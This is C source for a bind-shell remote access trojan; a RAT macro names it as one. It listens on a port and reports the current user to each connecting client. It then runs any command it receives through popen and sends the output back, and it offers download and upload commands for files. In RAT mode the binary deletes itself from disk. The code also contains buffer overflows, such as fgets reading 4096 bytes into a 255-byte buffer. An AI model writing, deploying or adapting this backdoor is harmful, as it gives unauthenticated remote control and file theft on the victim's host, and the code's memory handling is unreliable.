#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#define DEBUG 1
#define RAT 0

/* TO DO:
 * 1. Redirect STDERR to STDOUT just in case, to send back to client --Working
 * 2. Dont terminate after connection complete --Working
 * 3. Create download and upload commands for file in client --Download working
 * 4. figure out a better sleep timer for the termination string
 * 5. Debugger Mode in preprocessor --Working
 * 
 * Multithreading for each connection <-- may need to rebuild from the ground up
 * 
 */
 
 
int main(int argc, char *argv[]){
	int sockfd, status, new_fd, bytes;
	struct addrinfo hints, *res;
	struct sockaddr_storage their_addr;
	socklen_t addr_size = sizeof(their_addr);
	char paddr[INET_ADDRSTRLEN], receive[100], cmdbuf[100], tokcmdbuf[100], cmdtok[100], sendbuf[255], currentuser[99];
	char *ptr;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	
	if(argc != 2){
		printf("Usage: %s [port]\n",argv[0]);
		return -1;
	}
	//Get current running user
	FILE *fp = popen("whoami","r");
	if(fgets(currentuser, 99, fp) == NULL){
		printf("Cannot Retrieve Current user\n");
		return -1;
	}
	pclose(fp);
	
	if(RAT==1) remove(argv[0]);
	
	if((status=getaddrinfo(NULL, argv[1], &hints, &res)) != 0){
		fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
		return -1;
    }
	if((sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol)) == -1){
		perror("Socket Error");
		return -1;
	}
	if(bind(sockfd, res->ai_addr, res->ai_addrlen) == -1){
		perror("Bind Error");
		close(sockfd);
		return -1;
    }
    if(listen(sockfd, 1) == -1){
		perror("Listen Error");
		close(sockfd);
		return -1;
	}
	if(DEBUG) printf("Listening on %s\n", argv[1]);
	while(1){ //listen loop
		new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
		if (new_fd == -1) {
			perror("accept");
		}
	
		inet_ntop(AF_INET, &(((struct sockaddr_in*)&their_addr)->sin_addr), paddr, INET_ADDRSTRLEN);
		if(DEBUG) printf("New Connection From: %s\n", paddr);
	
		if(send(new_fd, currentuser, strlen(currentuser),0)<0) {
			perror("send");
		}
		while(1){ //connection loop
			if(DEBUG) printf("Entered Connection Loop\n");
			if((bytes = recv(new_fd, receive, 99, 0)) == -1){
				close(new_fd);
				perror("Recv Error");
				return -1;
			}
			if(bytes==0){
				if(DEBUG) printf("Client Disconnect\n");
				break;
			}


			if(DEBUG) printf("Recieved %s appending null byte\n", receive);
			receive[bytes]='\0';
			if(DEBUG) printf("Receive %s, shifting to buf\n", receive);
			strcpy(cmdbuf, receive);
			ptr=strchr(cmdbuf, '\n');
			*ptr='\0';
			if(DEBUG) printf("Buffer with removed new line %s\n", cmdbuf);
			strcpy(tokcmdbuf,cmdbuf);
			//download
			if(DEBUG) printf("Buffer %s and tokcmdbuf: %s\n", cmdbuf, tokcmdbuf);
			strcpy(cmdtok,strtok(tokcmdbuf," "));
			if(DEBUG) printf("cmdtok:%s\n",cmdtok);
			if(cmdtok==NULL) strcpy(cmdtok,cmdbuf); //If unable to be tokenized by space compare whole string 
			//strncmp(cmdtok,"test",5);
			//printf("Passed strncmptest\n");


			//DOWNLOAD
			if(strncmp(cmdtok, "download",9)==0){
				if(DEBUG) printf("Running as Download\n");
		 		FILE *fp = fopen(strtok(NULL," "),"r");
		 		if(fp!=NULL){
					while (fgets(sendbuf, 4096, fp) != NULL){
						if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
							perror("send");
						}	
					}
					sleep(1);
					if(send(new_fd, "000xxx000", 9, 0)<0){
						perror("send");
					}
					fclose(fp); 
				}
				else{
					if(DEBUG) printf("fopen return null");
				}
			}
			
			//UPLOAD
			else if(strncmp(cmdtok, "upload",9)==0){
				if(DEBUG) printf("Running as Upload\n");
				strcpy(cmdtok,strtok(NULL," "));
				if(DEBUG) printf("File being uploaded: %s\n", cmdtok);
		 		FILE *fp = fopen(strtok(NULL," "),"w");
		 		if(DEBUG) printf("Successfully able to open file for writing\n");
		 		while(1){
				if((bytes = recv(new_fd, receive, 99, 0)) == -1){
                		close(new_fd);
                        	perror("Recv Error");
                        	return -1;
				}
				receive[bytes]='\0';
				if(strncmp(receive, "000xxx000", 9)==0){
                	//printf("RECIEVED FINAL TERMINATOR\n");
                    break;
				}
				fputs(receive,fp);
			}
			if(DEBUG) printf("Complete\n");
			fclose(fp);
			}

			//SHELL COMMAND
			else{
				if(DEBUG) printf("Running as command\n");
				//printf("%s\n",strtok(NULL, " "));
				strcat(cmdbuf, " 2>&1");
				FILE *fp = popen(cmdbuf,"r");
				while (fgets(sendbuf, 4096, fp) != NULL){
					if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
						perror("send");
					}	
				}
				sleep(1);
				if(send(new_fd, "000xxx000", 9, 0)<0){
					perror("send");
				}
				if(DEBUG) printf("executed command %s", receive);
				pclose(fp);
			}


		}
		close(new_fd);
	}
	close(sockfd);
	return 0;
}
